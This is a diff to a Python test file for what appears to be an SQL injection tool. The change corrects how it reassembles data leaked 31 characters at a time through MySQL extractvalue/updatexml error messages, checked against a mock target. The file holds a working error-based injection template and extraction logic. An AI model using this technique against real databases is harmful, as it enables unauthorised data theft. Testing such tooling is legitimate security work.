@@ -21,26 +21,31 @@ def test_error_leak_parses_after_the_marker():
 
 
 def test_value_reassembles_truncated_windows():
-    """A long value comes back 32 chars at a time (real extractvalue/updatexml
-    truncate); the oracle reads each window and reassembles the whole."""
+    """A long value comes back a window at a time and is reassembled. The window is 31,
+    because extractvalue/updatexml cap the error at 32 chars *including* the ~ marker —
+    regression for a 32-char step that lost the 32nd char each window and stopped after
+    the first, returning only the head of the value on real MySQL."""
     secret = "DEADWOOD" * 10                              # 80 chars, spans 3 windows
 
     class _Trunc:
+        """Models real extractvalue: the error carries the marker + at most 31 data
+        chars, no matter how many SUBSTRING asks for."""
+
         def __init__(self):
             self.count = 0
 
         def get(self, url):
             self.count += 1
             payload = parse_qs(urlsplit(url).query)["id"][0]
-            off = int(re.search(r",(\d+),32\)", payload).group(1))
-            window = secret[off - 1:off - 1 + 32]         # emulate SUBSTRING truncation
+            off, req = (int(x) for x in re.search(r",(\d+),(\d+)\)", payload).groups())
+            window = secret[off - 1:off - 1 + req][:31]   # marker + <=31 chars per error
             return f"<pre>'~{window}'</pre>"
 
     h = _Trunc()
     eo = sqli.ErrorOracle(h, "http://t/profile?id=1", "id", "1", "mysql", "numeric",
                           "{v} AND {e}{cm}", "extractvalue(1,concat(0x7e,{e}))")
-    assert eo.read("SELECT secret") == secret
-    assert h.count == 3                                   # 32 + 32 + 16
+    assert eo.read("SELECT secret") == secret             # fully reassembled, nothing lost
+    assert h.count == 3                                   # 31 + 31 + 18
 
 
 def test_value_handles_a_non_truncating_target():
